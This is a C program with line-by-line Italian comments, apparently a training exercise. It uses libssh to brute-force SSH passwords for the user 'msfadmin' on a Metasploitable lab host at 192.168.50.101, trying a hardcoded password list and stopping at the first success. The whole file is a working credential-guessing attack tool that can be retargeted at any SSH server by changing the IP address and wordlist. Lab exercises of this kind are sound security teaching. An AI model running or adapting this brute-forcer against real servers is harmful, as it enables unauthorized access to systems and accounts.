// Questo programma tenta di accedere ad un server SSH (Metasploitable, 192.168.50.101)
// usando un username noto (msfadmin) e una lista di password.
// Per ogni password, prova la connessione SSH e stampa se l'autenticazione
// ha avuto successo o no. In caso negativo il programma continua a provare.


#include <libssh/libssh.h>       // libreria che serve per creare sessioni SSH, connettersi ai server, autenticarsi etc.
#include <libssh/callbacks.h>    // libreria per eventuali callback (non necessaria ma spesso inclusa con libssh)
#include <libssh/ssh2.h>         // librerira che definisce le strutture e funzioni del protocollo SSH2 (verisone piu sicura di SSH)
#include <stdlib.h>              // libreria standard di C 
#include <stdio.h>               // Libreria standard I/O (printf, fprintf, ecc.)ù



// funzione che tenta l'autenticazione SSH - "const char *" indica puntatori a caratteri costanti (username, hostname, password), 

int test_authentication(const char *username, const char *hostname, const char *password) {

    int rc; // indica che il codice di ritorno (rc) è un numero (int) 
            //che rappresenta il succeso o il fallimento dell'autenticazione

    ssh_session session; //tipo defini in libssh, rappresente una sessione SSH 
                         // "session" è la variabile che verrà usata per la connessione

    session = ssh_new(); //funzione per creare una sessione vuota

    if (session == NULL) {

          // se non si riesce a creare la sessione 
                            // NULL è una costante che indica un puntatore vuoto o invalido
        
        exit(-1);           // termina il programma con codice di errore -1
    }

// impostazioni delle opzioni della sessione

        ssh_options_set(session, SSH_OPTIONS_HOST, hostname); // impostazione dell'hostname (IP server) per la sessione
        ssh_options_set(session, SSH_OPTIONS_USER, username); // impostazione dell'username per la sessione

        rc = ssh_connect(session); // funzione che tenta di stabilire una connessione SSH al server, 
                                   //usando i parametri configurati 

        if (rc != SSH_OK) { // gestisce l'errore, se la connessione non è riuscita (re è diverso da SSH_OK) stampa un messaggio d'errore

            fprintf(stderr, "Error connecting: %s\n", ssh_get_error(session)); //messaggio d'errore all'utente
            ssh_free(session); // libera la meroria della sessione
            exit(-1);          // termina il programma

        }

// tentativo di autenticazione con password


        rc = ssh_userauth_password(session, NULL, password); // prova ad autenticare l'utente usando la password
                                                             // e salva in "rc" il risultato (successo, negato o errore)
                                                              
        if (rc == SSH_AUTH_SUCCESS) {      // se la password è corretta stampa un messaggio all'utente
            printf("Password found: %s\n", password);
        } else {                          // se la password è errata stampa l'errore sella sessione
            printf("Authentication failed: %s\n", ssh_get_error(session));
        }

        ssh_disconnect(session); // chiude la connessione SSH associata a "session" e libera risose lato server e lato client 
                                 
        ssh_free(session);       // libera la memoria usata per l'oggetto session
        return rc;               // restituisce il "codice di ritorno" della funzione (success, denied, error)

}

    

// funzione principale da cui parte l'esecuzione

    int main(){ 

        char *passwords[] = { // crea una lista di password possibili in un array, da provare sul server SSH.
            "emy", "msfadmin", "morty", "ninjaturtles", "vingardiumleviosa", "chocolatemuffin", "rivendell", "cthulhu"
        };

        int n_passwords = sizeof(passwords) / sizeof(passwords[0]); // calcola quante password ci sono nell'array 
                                                                    // e salva il risultato nella variabile "n_password" da usare nel ciclo for

        for (int i = 0; i < n_passwords; i++) { // ciclo for che prova ogni password dell'array una volta 
                                                // i è la variabile contatore del ciclo, fino a quando i è minore di n_password (numero totate delle parole) il ciclo continua 
                                                // i++ indica l'incremento del contatre ad ogni iterazionei
                                
            printf("Try credentials: %s:%s\n", "msfadmin", passwords[i]); // messaggio che mostra all'utente la combinazione username/password che stiamo provando

            if (test_authentication("msfadmin", "192.168.50.101", passwords[i]) == SSH_AUTH_SUCCESS) { // se il tentativo di login corrente funziona (la condizione è vera)
                                                                                                       // il programma si interrompe

            break; // interrompe il programma anche se non tutte le password sono stata provate perche è stata trovata quella corretta

            }
        }

        return 0; // il programma è terminato senza errori
    }
